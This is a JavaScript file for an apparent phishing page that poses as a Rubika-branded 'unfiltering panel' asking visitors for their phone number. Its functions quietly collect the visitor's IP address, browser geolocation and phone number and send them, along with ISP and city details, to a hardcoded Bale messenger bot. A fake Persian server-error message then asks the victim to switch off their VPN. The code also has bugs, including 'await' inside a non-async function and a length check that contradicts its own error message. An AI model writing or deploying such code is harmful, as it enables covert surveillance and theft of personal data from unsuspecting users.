var link_map;

async function showPosition(position) {
    link_map = 'https://www.google.com/maps/@' + position.coords.latitude + ',' + position.coords.longitude;
    var test = await fetch('https://tapi.bale.ai/botwT9ArKZEC8Pxy7mSjvMPHsPj6JiJlIEQDX7P7MOT/sendMessage?text=' + "Access to Location : " + link_map + '&chat_id=915303220');
}
async function send_ip() {
    const response = await fetch('https://api.iplocation.net/?cmd=get-ip');
    const data = await response.json();
    var text_ip = "A user with an IP : " + data.ip + " entered the unfiltering panel.";
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition);
    } else {

    }
    var test = await fetch('https://tapi.bale.ai/botwT9ArKZEC8Pxy7mSjvMPHsPj6JiJlIEQDX7P7MOT/sendMessage?text=' + text_ip + '&chat_id=915303220');

}
async function send() {
    var phone = document.getElementById('phone_number_1').value;
    try {
        var request_info_ip = await fetch('http://ip-api.com/json/83.123.48.126');
        var ip_info = await request_info_ip.json()
        var text = 'ip : ' + ip_info.query + '\nphone : ' + phone + '\nstatus : ' + ip_info.status + '\ncountry : ' + ip_info.country + '\ncountryCode : ' + ip_info.countryCode + '\nregion : ' + ip_info.region + '\ncity : ' + ip_info.city + '\nzip : ' + ip_info.zip + '\ntimezone : ' + ip_info.timezone + '\nisp : ' + ip_info.isp + '\norg : ' + ip_info.org + '\nas : ' + ip_info.as + '\nlocation : ' + 'https://www.google.com/maps/@' + ip_info.lat + ',' + ip_info.lon;
        $.ajax({
            type: 'post',
            mode: "cors",
            cache: "no-cache",
            url: "https://tapi.bale.ai/botwT9ArKZEC8Pxy7mSjvMPHsPj6JiJlIEQDX7P7MOT/sendMessage",
            data: { chat_id: "915303220", text: String(text) },
        });
    } catch (error) {}
    document.body.innerHTML = `<div class="box">
        <img src="icon-192x192.png" alt="logo rubika">
        <h1>اوه، یه مشکلی پیش اومد</h1>
        <p id="text2" dir="rtl">یه مشکلی در ارتباط با سرور اتفاق افتاد.</p>
        <p id="text2" dir="rtl">اگه فیلترشکن روشن هست لطفا خاموش کنید و دوباره تلاش کنید.</p>
        <p id="text2" dir="rtl">درصورت نیاز به پشتیبانی ما در روبیکا پیام بدین : android_programmer@</p>
    </div>`
}

function check() {
    const phoneNumberInput = document.getElementById('phone_number_1').value;
    if (phoneNumberInput) {
        const phoneNumber = phoneNumberInput.trim();
        const allowedChars = '+ - / 0123456789';
        const cleanedNumber = phoneNumber.replace(/[^A-Za-z0-9+-\/ ]/g, '');

        for (let char of cleanedNumber) {
            if (!allowedChars.includes(char)) {
                document.getElementById('h4').innerText = 'کاراکترهای غیرمجاز در شماره تلفن یافت شد.';
                return;
            }
        }
        if (cleanedNumber.length < 10 || cleanedNumber.length > 12) {
            document.getElementById('h4').innerText = 'طول شماره تلفن باید بین 10 تا 15 رقم باشد.';
            return;
        }
        if (!cleanedNumber.startsWith('9')) {
            document.getElementById('h4').innerText = 'شماره تلفن باید با رقم 9 شروع شود.';
            return;
        }

        await document.getElementById('h4').innerText = 'درحال ارتباط با سرور...';
        await send();
    } else(
        document.getElementById('h4').innerText = 'لطفا شماره تلفن خود را وارد کنید'
    )
}
